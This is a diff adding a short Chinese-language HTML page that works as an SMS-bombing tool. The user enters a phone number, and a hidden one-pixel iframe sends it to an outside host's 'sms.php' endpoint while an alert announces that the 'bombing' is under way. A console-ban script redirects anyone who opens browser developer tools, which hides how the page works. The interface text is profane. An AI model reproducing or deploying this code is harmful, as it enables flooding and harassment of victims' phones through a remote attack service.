@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="zh_CN">
+<head> 
+	<meta charset="utf-8" /> 
+  <script src="https://cdn.jsdelivr.net/gh/fz6m/console-ban@2.2/dist/console-ban.min.js"></script>
+  <script>
+    ConsoleBan.init()
+    ConsoleBan.init({
+      redirect: 'http://huaji.icu/error/403.html'
+    })
+  </script>
+	<style type="text/css">
+	*{
+		padding: 0;
+		margin: 0;
+	}
+	input:nth-of-type(2){
+		width: 60px;
+		text-align: center;
+		cursor: pointer;
+	}
+	</style>
+</head> 
+<body> 
+	轰他娘的2: <input id="text">
+	<input id="submit" value="开炮" onclick="chufa()">
+	<iframe id="if" src="" style="display: none;"></iframe>
+</body> 
+</html>
+<script type="text/javascript">
+function chufa(){
+	var a = document.getElementById('text').value;
+	var fa = document.getElementById("if");
+	if(/^\d+$/.test(a) == true){
+		fa.style = 'width:1px;height:1px;';
+		fa.src = 'http://i.wannet.xyz/E7CnrgasV5kn1v3qte/sms.php?m='+a+'&r=0';
+                alert("开炮成功，正在轰炸ing.....");
+    }
+    else{
+    	alert("他妈的,目标呢！想办法干他一炮");
+    }
+}
+</script>
